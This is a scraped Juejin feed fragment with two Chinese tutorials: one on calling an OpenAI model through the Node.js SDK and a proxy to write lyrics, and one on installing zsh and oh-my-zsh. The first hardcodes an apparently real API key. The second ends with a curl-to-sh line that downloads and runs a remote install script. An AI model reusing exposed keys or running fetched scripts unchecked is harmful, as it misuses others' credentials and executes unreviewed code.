</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零开始调用大模型：使用 OpenAI SDK 实现歌词生成，手把手实战指南]]></title>    <link>https://juejin.cn/post/7589897523269091338</link>    <guid>https://juejin.cn/post/7589897523269091338</guid>    <pubDate>2026-01-01T09:23:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589897523269091338" data-draft-id="7589920884308901914" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从零开始调用大模型：使用 OpenAI SDK 实现歌词生成，手把手实战指南"/> <meta itemprop="keywords" content="前端,OpenAI,LLM"/> <meta itemprop="datePublished" content="2026-01-01T09:23:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="栀秋666"/> <meta itemprop="url" content="https://juejin.cn/user/2566698322650307"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从零开始调用大模型：使用 OpenAI SDK 实现歌词生成，手把手实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2566698322650307/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    栀秋666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T09:23:42.000Z" title="Thu Jan 01 2026 09:23:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在 AIGC 浪潮席卷全球的今天，<strong>大语言模型（LLM）</strong> 已不再是科研实验室里的“黑科技”，而是每一个开发者都能轻松调用的强大工具。</p>
<p>而作为行业标杆的 <strong>OpenAI</strong>，通过其简洁高效的 API 和完善的 SDK 支持，让我们只需几行代码就能让 AI 写诗、作词、编程甚至写周报！</p>
<p>本文将以一个真实场景为例——<strong>让 GPT 为汪峰写一首献给“森林北”的情歌</strong>，带你从环境搭建到文本生成，完整走通一次大模型调用流程。</p>
<p>全程无坑、代码可运行，<strong>新手友好，老鸟也能收获细节技巧</strong>，建议收藏+点赞，防止走丢！</p>
<hr/>
<h3 data-id="heading-1">🌱 一、开发准备：5分钟初始化项目</h3>
<p>我们使用 <strong>Node.js + npm</strong> 搭建后端服务环境，轻量高效，适合快速验证 AI 能力。</p>
<h4 data-id="heading-2">1. 初始化项目</h4>
<pre><code class="hljs language-bash" lang="bash">npm init -y
</code></pre>
<p>这条命令会自动生成 <code>package.json</code> 文件，记录你的项目依赖和配置信息。</p>
<h4 data-id="heading-3">2. 安装 OpenAI SDK</h4>
<pre><code class="hljs language-bash" lang="bash">npm install openai
</code></pre>
<p>OpenAI 官方提供的 SDK 封装了所有 API 接口，省去手动处理 HTTP 请求的繁琐工作，<strong>一行引入，即刻调用</strong>。</p>
<blockquote>
<p>⚠️ 注意：SDK 需要 Node.js 版本 &gt;= 16，请确保本地环境满足要求。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">🔑 二、配置客户端：拿到通往 AI 世界的钥匙</h3>
<p>接下来是关键一步：<strong>创建 OpenAI 客户端实例</strong>。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'openai'</span>;

<span class="hljs-keyword">const</span> openai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({
  <span class="hljs-attr">apiKey</span>: <span class="hljs-string">'sk-RUP7SvQy4trgMCDsbBXxjgpNSR235Kqa7tjIh8jv1NBlMnzI'</span>, <span class="hljs-comment">// 替换为你自己的 Key</span>
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.302.ai/v1'</span> <span class="hljs-comment">// 可选：代理地址，解决网络访问问题</span>
});
</code></pre>
<h4 data-id="heading-5">关键参数说明：</h4>

















<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>apiKey</code></td><td>访问权限凭证，相当于“密码”，务必保密！</td></tr><tr><td><code>baseURL</code></td><td>API 地址，默认为 <code>https://api.openai.com/v1</code>，此处使用第三方代理（如无法直连 OpenAI 可用）</td></tr></tbody></table>
<p>💡 <strong>小贴士</strong>：</p>
<ul>
<li>Key 可在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fapi-keys" target="_blank" title="https://platform.openai.com/api-keys" ref="nofollow noopener noreferrer">OpenAI 官网</a> 获取。</li>
<li>若你在国内，推荐使用稳定中转服务（如 302.ai、FastGPT 等），避免请求超时。</li>
</ul>
<hr/>
<h3 data-id="heading-6">🎤 三、调用模型：让 AI 成为林夕级别的作词人</h3>
<p>我们的目标很明确：</p>
<blockquote>
<p>“以林夕风格，为汪峰写一首关于‘森林北’的爱情歌曲，100 字左右。”</p>
</blockquote>
<h4 data-id="heading-7">使用 <code>completions.create()</code> 接口</h4>
<p>这是 OpenAI 最经典的文本生成接口，适用于单次输入、输出任务，比如写文案、写歌词、补全文本等。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">'gpt-3.5-turbo-instruct'</span>,
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">`
    假如你是林夕这样的爱情歌曲作词大家，
    请你写一首100字,为汪峰,写一首他爱上森林北的歌曲。
    森林北是一位美丽，勇敢，会骑马的女孩儿。
  `</span>,
  <span class="hljs-attr">max_tokens</span>: <span class="hljs-number">800</span>,
  <span class="hljs-attr">temperature</span>: <span class="hljs-number">1</span>
});
</code></pre>
<h4 data-id="heading-8">参数详解：</h4>






























<table><thead><tr><th>参数</th><th>作用</th><th>推荐值</th></tr></thead><tbody><tr><td><code>model</code></td><td>指定模型版本</td><td><code>gpt-3.5-turbo-instruct</code> 性价比之王</td></tr><tr><td><code>prompt</code></td><td>提示词，决定生成内容方向</td><td>描述越细，结果越准 ✅</td></tr><tr><td><code>max_tokens</code></td><td>控制最大输出长度</td><td>一般设为 512~1024</td></tr><tr><td><code>temperature</code></td><td>创意随机性控制</td><td><code>0.7~1.0</code> 平衡创意与稳定性</td></tr></tbody></table>
<p>🎯 <strong>Prompt 工程技巧</strong>：</p>
<ul>
<li>明确角色：“假如你是林夕”</li>
<li>给出对象：“汪峰爱上了森林北”</li>
<li>设定特征：“会骑马、勇敢、自由的灵魂”</li>
<li>限制格式：“100字以内，押韵优先”</li>
</ul>
<blockquote>
<p>✅ 优质 Prompt = 高质量输出！</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">📤 四、获取结果：把 AI 的灵感打印出来</h3>
<p>API 返回的是 JSON 格式数据，我们需要从中提取生成的文本。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> song = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">text</span>.<span class="hljs-title function_">trim</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'🎵 歌词是：\n'</span> + song);
</code></pre>
<h4 data-id="heading-10">示例输出（模拟）：</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27b049ed4d1c488baba31029ffd41676~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qCA56eLNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864221&amp;x-signature=479bHQbZAUhjLTsiQglguUB9xHE%3D" alt="image.png" loading="lazy"/>
是不是已经有汪峰那味儿了？🎸</p>
<hr/>
<h3 data-id="heading-11">🛡️ 五、健壮性增强：加入错误处理机制</h3>
<p>实际开发中不能忽略异常情况。网络波动、Key 失效、请求超时都可能导致程序崩溃。</p>
<p>建议用 <code>try/catch</code> 包裹调用逻辑：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({ <span class="hljs-comment">/* ... */</span> });
  <span class="hljs-keyword">const</span> song = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">text</span>.<span class="hljs-title function_">trim</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'✅ 成功生成歌词：\n'</span> + song);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'❌ 调用失败：'</span>, error.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'👉 检查 API Key 是否正确'</span>);
  }
}
</code></pre>
<p>常见错误码：</p>
<ul>
<li><code>401</code>: Key 错误</li>
<li><code>429</code>: 请求频率过高</li>
<li><code>500</code>: 模型服务器异常</li>
</ul>
<hr/>
<h3 data-id="heading-12">🔄 六、进阶思考：Completion vs Chat 接口怎么选？</h3>
<p>你可能会问：现在主流都是 <code>chat.completions</code>，为什么还用 <code>completion</code>？</p>
<h4 data-id="heading-13">对比表格：</h4>



































<table><thead><tr><th>特性</th><th><code>completions</code></th><th><code>chat.completions</code></th></tr></thead><tbody><tr><td>适用场景</td><td>单轮生成任务</td><td>多轮对话系统</td></tr><tr><td>输入格式</td><td>纯文本 prompt</td><td>消息数组（role-based）</td></tr><tr><td>上下文记忆</td><td>❌ 不支持</td><td>✅ 支持历史对话</td></tr><tr><td>成本</td><td>较低</td><td>略高（尤其长上下文）</td></tr><tr><td>推荐用途</td><td>写作、摘要、填空</td><td>客服机器人、聊天应用</td></tr></tbody></table>
<p>📌 <strong>结论</strong>：</p>
<ul>
<li>如果只是<strong>一次性生成内容</strong>（如写歌词、写邮件），<code>completion</code> 更简单直接；</li>
<li>如果要做<strong>智能对话系统</strong>，必须上 <code>chat</code> 接口。</li>
</ul>
<hr/>
<h3 data-id="heading-14">🚀 七、拓展玩法：你可以这样玩得更嗨</h3>
<p>学会了基础调用，下一步就是创造价值！以下是一些延展思路：</p>
<h4 data-id="heading-15">1. 批量生成歌词片段</h4>
<p>结合数据库或 CSV，批量为不同人物生成专属情歌。</p>
<h4 data-id="heading-16">2. 构建 Web 页面</h4>
<p>用 Express 或 Next.js 搭个网页，让用户填写“歌手+恋人名字+关键词”，实时生成歌词。</p>
<h4 data-id="heading-17">3. 微调模型（Fine-tuning）</h4>
<p>收集林夕风格歌词进行微调，打造专属“林夕Bot”。</p>
<h4 data-id="heading-18">4. 结合语音合成</h4>
<p>用 TTS（Text-to-Speech）把歌词念出来，做成 AI 演唱 Demo！</p>
<hr/>
<h3 data-id="heading-19">💬 八、结语：掌握核心能力，才能驾驭 AI 浪潮</h3>
<p>通过这篇文章，你已经掌握了：</p>
<p>✅ 如何初始化 Node.js 项目<br/>
✅ 如何安装并配置 OpenAI SDK<br/>
✅ 如何编写高质量 Prompt<br/>
✅ 如何调用 completion 接口生成文本<br/>
✅ 如何处理异常、优化用户体验</p>
<p>更重要的是，你理解了：</p>
<blockquote>
<p><strong>大模型不是魔法，而是工具；真正的魔法，在于你怎么使用它。</strong></p>
</blockquote>
<p>无论你是前端、后端、全栈还是产品经理，只要学会调用大模型，就能为自己赋能十倍效率。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[终端环境：zsh、oh-my-zsh与 7 个效率插件]]></title>    <link>https://juejin.cn/post/7589935326781898786</link>    <guid>https://juejin.cn/post/7589935326781898786</guid>    <pubDate>2026-01-01T09:40:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326781898786" data-draft-id="7589935326781849634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="终端环境：zsh、oh-my-zsh与 7 个效率插件"/> <meta itemprop="keywords" content="Shell"/> <meta itemprop="datePublished" content="2026-01-01T09:40:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="____xl"/> <meta itemprop="url" content="https://juejin.cn/user/448256474093528"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            终端环境：zsh、oh-my-zsh与 7 个效率插件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256474093528/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ____xl
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T09:40:27.000Z" title="Thu Jan 01 2026 09:40:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">终端环境：zsh、oh-my-zsh、提示主题与 7 个效率插件</h2>
<p>本文主要介绍如何构建一个高效的终端环境，包括 zsh 与 bash 的对比、zsh 的安装、oh-my-zsh 框架的使用与主题配置，以及 7 个实用插件（含 5 个内置插件 + 2 个社区插件），提升命令行效率。</p>
<hr/>
<h3 data-id="heading-1">1. 为什么使用 zsh？</h3>
<p>zsh（Z Shell）是一个功能强大的 shell，相较 bash 有以下优势：:</p>
<ul>
<li><strong>更强的自动补全</strong>：不仅补全命令，还能补全参数、选项和文件名，同时可显示简短帮助提示。</li>
<li><strong>更好的脚本与插件支持</strong>：拥有活跃社区和丰富插件生态，可大幅增强 shell 功能。</li>
<li><strong>主题与提示符高度可定制</strong>：自定义命令行外观和显示内容（如 Git 分支、环境信息等）。</li>
<li><strong>智能交互体验</strong>：支持拼写纠正与近似完成等功能，提高使用便捷性。</li>
<li><strong>增强文件匹配及配置灵活性</strong>：支持扩展通配符和历史共享等高级特性。</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. 安装 zsh</h3>
<p>在不同操作系统下安装 zsh 的方式各不相同，常见命令示例：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian / Ubuntu</span>
apt install zsh

<span class="hljs-comment"># CentOS</span>
yum install -y zsh

<span class="hljs-comment"># Arch</span>
pacman -S zsh

<span class="hljs-comment"># Fedora</span>
dnf install zsh
</code></pre>
<p>macOS 自 2019 起默认使用 zsh，无需手动安装。若需要安装或更新，可使用 <code>brew install zsh</code>。安装后，用 <code>chsh -s /bin/zsh</code> 将 zsh 设置为默认 shell。</p>
<hr/>
<h3 data-id="heading-3">3. oh-my-zsh 框架</h3>
<p><strong>oh-my-zsh</strong> 是一个用于管理 zsh 配置的轻量框架，内置大量主题与插件。安装命令如下：</p>
<pre><code class="hljs language-bash" lang="bash">sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span>
